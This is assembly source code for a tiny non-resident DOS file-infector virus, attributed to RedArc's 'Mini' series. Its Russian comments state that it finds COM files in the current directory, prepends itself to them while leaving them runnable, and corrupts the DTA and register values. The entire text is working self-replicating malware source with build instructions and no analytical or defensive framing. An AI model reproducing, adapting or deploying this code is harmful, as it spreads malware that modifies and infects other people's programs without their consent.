; Серия Mini (c) by RedArc

; Mini.75a (c) CrkV

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ оставляет программы работоспособными
;■ не заражает повторно уже инфицированные программы
;■ портит DTA
;■ не резидентный

;■ портит начальные значения регистров

;use tasm mini_75 /m2

Model Tiny
.code
org 100h
start:
        Inc     Dh
        Mov     Es,Dx
        Inc     Cx
        Xchg    Ax,Di
        Sub     Si,Si
        Repe    MovSB
        Mov     Si,VirLength+100h
        Push    Es Di Cs
        Pop     Cx
        Repe    MovSB
        Mov     Dx,Offset FileMask
        Mov     Ah,4Eh

@0:
        Int     21h
        Jnc     @1
        RetF
@1:
        Mov     Ax,3D02h
        Mov     Dx,9Eh
        Int     21h
        Xchg    Bx,Ax
        Mov     Ah,3Fh
        Mov     Dx,VirLength+100h
        Mov     Cx,Sp
        Int     21h
        Add     Ax,Virlength
        Push    Ax
        Sub     Cx,Cx
        Mul     Cx
        Mov     Ah,42h
        Int     21h
        Pop     Cx
        Mov     Ah,40h
        Pop     Dx
        Push    Dx
        Int     21h
@2:     Mov     Ah,4Fh
        Jmp     Short @0

FileMask db '*.c*', 0h
VirLength equ $-start
        Ret
end start
